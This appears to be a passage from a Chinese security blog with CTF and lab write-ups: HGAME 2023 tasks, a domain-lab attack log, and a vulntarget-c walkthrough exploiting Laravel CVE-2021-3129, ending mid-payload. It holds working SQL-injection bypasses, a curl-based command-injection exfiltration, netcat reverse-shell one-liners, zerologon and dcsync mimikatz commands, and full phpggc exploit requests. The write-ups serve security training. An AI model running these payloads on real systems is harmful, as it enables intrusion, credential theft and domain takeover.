python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py url</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/GitHack/dist]</span><br><span class="line">└─<span class="comment"># cd week-2.hgame.lwsec.cn_31248</span></span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">Th1s_1s-flag</span><br><span class="line"></span><br><span class="line">┌──(root💀bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">└─<span class="comment"># cat Th1s_1s-flag</span></span><br><span class="line">hgame&#123;Don<span class="string">&#x27;t^put*Git-in_web_directory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h4><p><a href="https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97">https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97</a></p><h4 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h4><p>弱口令，爆破一下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230213151310768.png" alt="image-20230213151310768"></p><p>user01<br>admin123</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">search_id=1  显然注入了</span><br><span class="line">search_id=1/**/order/**/by/**/1    //Error Occurred  空格被过滤 /**/</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred  /**/ 被过滤 用/*123*/ 替换</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred</span><br><span class="line">//这里语句没有问题，猜测是or被过滤了，我们在加一个or</span><br><span class="line">search_id=1/*123*/oorrder/*123*/by/*123*/1    //hard disk1</span><br><span class="line">//这里oorrder 成功，我们可以猜测后台是吧or替换为空了,</span><br><span class="line">注出3个字段</span><br><span class="line">search_id=-1/*1123*/union/*1123*/select/*2123*/2,3,4     //Error Occurred</span><br><span class="line">这里猜测是union select 替换了，因为上面也or替换了</span><br><span class="line">search_id=-1/*1123*/ununionion/*1123*/selselectect/*2123*/2,3,4</span><br><span class="line">or  大小写</span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,3,database() //Error Occurred</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Database(),4 //database  双写or大写 //se4rch   4</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Group_concat(table_name)/*2123*/frOm/*2123*/infoorrmation_schema.tables/*2123*/whEre/*2123*/table_schema/*2123*/like/*2123*/&#x27;se4rch&#x27;</span><br><span class="line"></span><br><span class="line">获取表名</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,datadatabasebase(),4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h4><p>ping to host<br>无回显</p><p>vps监听 <code>nc -lkvvnp 7777</code></p><p>有过滤  如果不加base64   会不显示</p><p>ip=127.0.0.1%26%26curl%09<a href="http://182.92.176.62:7777/%60nl%09/f*|base64%60">http://182.92.176.62:7777/`nl%09/f*|base64`</a>  </p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230201105313163.png" alt="image-20230201105313163"></p><p>/ICAgICAxCWhnYW1le3AxbkdfdDBfQ29tTTRuRF9FeGVjVXQxb25fZEFuZ0VyUnJSclJyUiF9Cg==</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h4><p>bind xxe</p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ezwin"><a href="#ezwin" class="headerlink" title="ezwin"></a>ezwin</h4><p>这个题比较有意思了，这里Volatility 3 和Volatility 2有截然不同的结果，不是很理解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.envars.Envars | grep hgame</span><br><span class="line">3492resssihost.exe      0x222e2561bc0canHGAME_FLAGhed   hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3520    svchost.exe     0x1d2f6e033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3528    svchost.exe     0x163d90033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3668    taskhostw.exe   0x1ced6651bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3828    ctfmon.exe      0x1e2d9081bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3992    explorer.exe    0x1151bf0       HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 envars | grep hgame</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">    3492 sihost.exe           0x00000222e2560fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3520 svchost.exe          0x000001d2f6e027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3528 svchost.exe          0x00000163d90027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3668 taskhostw.exe        0x000001ced6650fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3828 ctfmon.exe           0x000001e2d9080fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3992 explorer.exe         0x0000000006607a60 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bohemian)-[/tools/volatility3]</span><br><span class="line">└─<span class="comment"># python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.hashdump</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">User    rid     lmhash  nthash</span><br><span class="line"></span><br><span class="line">Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        c4b2cf9cac4752fc9b030b8ebc6faac3</span><br><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀bohemian)-[/tools/volatility]</span><br><span class="line">└─# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Administrator:500:6a21484f766d3766175c3a3f7763e688:b08b01ca485aea836bacb3aad6c45b26:::</span><br><span class="line">Guest:501:6a0af1d516e75dd696266273ce666e21:82e20e246547aa3ae431aec52f53cdf5:::</span><br><span class="line">DefaultAccount:503:ce2bccae5ac352b8e38c1d3194475940:4a947667f1ab4136246644fa344650b3:::</span><br><span class="line">WDAGUtilityAccount:504:efa88db8c9ac1b9f5798999b03241b90:611c4a5c71e01e167d8ef049135ff150:::</span><br><span class="line">Noname:1000:f4272abfe4b751256f7b4a0932246690:3454cf62689ec53e97581f7a3312c3a9:::</span><br></pre></td></tr></table></figure><p>volatility 2 filescan 时我们可以看到有个flag.7z 题目提示也给了，这里dumpfiles时 -q 提取不来东西，</p><p>但是可以-pid 找到压缩文件的进程号，这样会提取出来一下无关的文件，写个简单脚本 看看那个是zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        file <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216150417789.png" alt="image-20230216150417789"></p><p>可以看到两个7-zip文件，拖到win下  然后解一下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216151102965.png" alt="image-20230216151102965"></p><p>我们可以看到这个6270的dat文件可以解压出来东西，但是呢，这个txt被wannaren加密了，经过搜索，火绒有一个可以解密的软件</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216152439725.png" alt="image-20230216152439725"></p><p>新佛曰，解出来提交发现不对，问了一下出题人，发现不对，说要用volatility 3，题目其实也提示了要用三，当时机器没有三，我就用三重新做一遍，一样的步骤，提出来的就不要一样。后来我去搜了这个新佛曰的码，发现是2022年的题。同一个环境但是提出来的压缩包不一样，不太清楚。</p><p>用volatility 3从新做一下，</p><p>python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.dumpfiles –pid 7584</p><p>这里我使用这个命令提的，这样会提出来一大堆文件，同样用脚本判断一下那个zip,这个根据名字也能大概猜出</p><p>file.0xd00641b5ba70.0xd00641180e30.DataSectionObject.flag.7z.dat</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216153755607.png" alt="image-20230216153755607"></p><p>打开可以看到密码是解出来hash</p><p>84b0d9c9f830238933e7131d60ac6436</p><p>查询结果： asdqwe123</p><p>就可以了</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022弱口令安全实验室招新赛-靶机挑战</title>
      <link href="/2023/01/05/CTFS/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/"/>
      <url>/2023/01/05/CTFS/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144545334.png" alt="image-20230105144545334"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144556972.png" alt="image-20230105144556972"></p><p><a href="https://www.iculture.cc/rce/">https://www.iculture.cc/rce/</a></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.144.128 9990 &gt;/tmp/f</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105145002174.png" alt="image-20230105145002174"></p><p>setg Proxies socks5:192.168.144.128:1080 #设置全局代理<br>set ReverseAllowProxy true #这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。</p><p>setg Proxies socks5:192.168.144.136:8888 #设置全局代理<br>set ReverseAllowProxy true #这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。</p><p>:&gt;fscan.exe -h 192.168.48.1/24<br>fscan.exe -h 192.168.48.1/24</p><hr><p>  / _ \     ___  ___ _ __ __ _  <em><strong>| | __<br> / /<em>/</em></strong></em>/ __|/ <strong>| ‘</strong>/ <em>` |/ <strong>| |/ /<br>/ /<em>\_</em></strong></em>__ \ (<strong>| | | (_| | (</strong>|   &lt;<br>____/     |___/___|_|  __,_|___|_|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target ‘192.168.48.128’ is alive<br>(icmp) Target ‘192.168.48.200’ is alive<br>icmp alive hosts len is: 2<br>192.168.48.200:139 open<br>192.168.48.128:139 open<br>192.168.48.128:88 open<br>192.168.48.200:445 open<br>192.168.48.128:445 open<br>192.168.48.200:135 open<br>192.168.48.128:135 open<br>alive ports len is: 7<br>start vulscan<br>[+] 192.168.48.200      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>[<em>] 192.168.48.200       WEAK\WIN-S96L5Q5A734   Windows Server 2008 R2 Datacenter 7600<br>NetInfo:<br>[*]192.168.48.128<br>   [-&gt;]WIN-JK2FG246GEF<br>   [-&gt;]192.168.48.128<br>[</em>] 192.168.48.128 [+]DC WEAK\WIN-JK2FG246GEF   Windows Server 2008 R2 Datacenter 7600<br>[+] 192.168.48.128      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>已完成 9/9<br>scan end</p><p>WIN-JK2FG246GEF$</p><p>kiwi_cmd “lsadump::zerologon /target:192.168.48.128 /account:WIN-JK2FG246GEF$” exit</p><p>mimikatz.exe “lsadump::zerologon /target:192.168.48.128 /account:DC01$” exit</p><p>kiwi_cmd “lsadump::dcsync /domain:WEAK.COM /dc:WIN-JK2FG246GEF.WEAK.COM /user:administrator /authuser:WIN-JK2FG246GEF$ /authdomain:WEAK /authpassword: /authntlm”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget-c</title>
      <link href="/2022/11/29/vulntarget-c/"/>
      <url>/2022/11/29/vulntarget-c/</url>
      
        <content type="html"><![CDATA[<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>相关漏洞技术：laravel、OVAS-PHP相关漏洞、隧道代理、免杀、提权、CVE-2021-3129<br>、CVE-2021-3493等<br>下载地址：<br>百度云链接:<br><a href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a><br>提取码: 1p9p</p><p>其中vulntarget-c是本次环境</p><p>github地址：</p><p><a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p><h4 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h4><p><img src="/images/vulntarget-e/image-20221129102253692.png" alt="image-20221129102253692"></p><h4 id="vm网卡配置"><a href="#vm网卡配置" class="headerlink" title="vm网卡配置"></a>vm网卡配置</h4><p>将百度网盘的靶场c下载下来，使用vm打开，我们先编辑一下虚拟网卡网段</p><p><img src="/images/vulntarget-e/image-20221129102606686.png" alt="image-20221129102606686"></p><p>这里要注意不勾选将主机虚拟连接到此网络，如果勾选的话，你会发现，我们直接能从主机ping到10，20段，这样就不是内网了。</p><p>第一台是ubuntu20</p><p><img src="/images/vulntarget-e/image-20221129102818958.png" alt="image-20221129102818958"></p><p>第二台win2016</p><p><img src="/images/vulntarget-e/image-20221129102845711.png" alt="image-20221129102845711"></p><p>第三台ubuntu16</p><p><img src="/images/vulntarget-e/image-20221129102914418.png" alt="image-20221129102914418"></p><p>设置好之后开机，但是还是有一点问题，默认作者配置的时候给到的是静态ip30段的，我们需要改一下，我这边net是144段的，所以我们给网卡一个144段的静态IP就可以了</p><p><code>账密1：vulntarget/root</code><br><code>账密2：root/root#qwe</code></p><p>用root账号登录一下，改掉网卡配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">root<span class="comment">#qwe</span></span><br><span class="line">vim /etc/netplan/00-installer-config.yaml <span class="comment">#编辑网卡配置文件</span></span><br><span class="line">:wq</span><br><span class="line">netplan apply <span class="comment">#重启网卡</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129103520466.png" alt="image-20221129103520466"></p><p><img src="/images/vulntarget-e/image-20221129103635589.png" alt="image-20221129103635589"></p><p>这里注意网关也改一下，当然这里网卡不唯一，我这样后面比较简单不需要改网卡配置文件了</p><p>我们简单扫一下<img src="/images/vulntarget-e/image-20221129104349743.png" alt="image-20221129104349743"></p><p>可以看到55的ip开着80和22，访问一下</p><p><img src="/images/vulntarget-e/image-20221129104507816.png" alt="image-20221129104507816"></p><p>至此在vm上环境搭建已经完成</p><h3 id="laravel渗透-CVE-2021-3129"><a href="#laravel渗透-CVE-2021-3129" class="headerlink" title="laravel渗透-CVE-2021-3129"></a>laravel渗透-CVE-2021-3129</h3><p>我们可以看到是一个laravel的框架网站，既然靶场，那肯定存在漏洞，在右下角我们也可以看到Laravel v8.78.1 (PHP v7.4.3)，那肯定是复现laravel历史漏洞了。网上搜一下版本号，(可以看到其他佬发的这个靶场wp，确定CVE-2021-3129),发现是2021-3129，反正我是没有发现，因为看文章都是说影响版本在Laravel&lt;=8.4.2,<code>https://www.freebuf.com/vuls/280508.html</code>,但是靶机环境在8.78，也有可能是，<code>Ignition（&lt;=2.5.1）</code>,这个插件的版本的问题，这个文章说的，<code>https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</code><br>emmmm就当发现了吧。我们去复现一下。</p><p>首先肯定是github找各种poc，我也找了各种poc，都打了一遍，emmmm，都没打通，不是php报错就是not fund rce ，可能是kali的问题，没有去其他系统测试，有兴趣的小伙伴测试一下。</p><p><code>http://wiki.peiqi.tech/wiki/frame/Laravel/Laravel%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129.html</code><br><code>https://github.com/SNCKER/CVE-2021-3129</code><br><code>https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</code></p><p><img src="/images/vulntarget-e/image-20221129174149286.png" alt="image-20221129174149286"></p><p><img src="/images/vulntarget-e/image-20221129174203408.png" alt="image-20221129174203408"></p><p>这几个poc都试了一下，没有打通，没有关系，我们手工复现一下。<br>参考下面这篇文章</p><p><code>https://www.freebuf.com/vuls/280508.html</code><br>具体原理这里就不赘述了，直接打</p><p>先访问网站，抓包，然后我们可以看到包里有许多内容，把下面的删掉，然后只留四行</p><p><img src="/images/vulntarget-e/image-20221129175857744.png" alt="image-20221129175857744"></p><p><img src="/images/vulntarget-e/image-20221129180059768.png" alt="image-20221129180059768"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>168</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到能够执行，</p><p>下载GitHub上下载的docker环境中带有exp，使用此exp需要下载phpggc</p><p><code>git clone https://github.com/ambionics/phpggc.git</code></p><p>改一下777的权限，下面生成poc的时候会用到</p><p>这里我们生成poc。要到刚刚phpggc目录下，上面那篇文章中已经有phpinfo了，跟着复现就行了，亲测phpinfo没有问题。因为我上面exp脚本都不能用，所以想着搜一个手工复现的打webshell的方法，奈何网上的方法都只到phpinfo就结束了，并没有生成webshell的，因为这里面我们打一遍phpinfo之后，日志文件会重新生成，🐎并不会留着日志里，所以我们要有一个反弹shell的方法，或者生成webshell，经过测试，太菜了，fileputcontent没有成功，echo也没有成功，但是没给poc，我们自己打一下</p><p>这里是反弹shell的，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.4 -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.144.128 9999 &gt;/tmp/f&#x27;);phpinfo();&quot;</span> --phar phar -o php://output | base64 -w 0 | python -c <span class="string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129182228006.png" alt="image-20221129182228006"></p><p>生成一串码，</p><p>上面已经证明漏洞存在</p><p>然后bp发包，清空日志</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>328</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">![image-20221129201015519](/images/vulntarget-e/image-20221129201015519.png)</span><br><span class="line"></span><br><span class="line">发送如下数据包，给Log增加一次前缀，用于对齐：</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.144.55</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201219036.png" alt="image-20221129201219036"></p><p>将POC作为viewFile的值，发送数据包，这里最后有个a别忘了。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5514</span><br><span class="line"></span><br><span class="line"><span class="dns">&#123;</span></span><br><span class="line"><span class="dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line"><span class="dns">  &quot;parameters&quot;: &#123;</span></span><br><span class="line"><span class="dns">    &quot;variableName&quot;: &quot;username&quot;,</span></span><br><span class="line"><span class="dns">    &quot;viewFile&quot;: &quot;=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=70=00=63</span>=<span 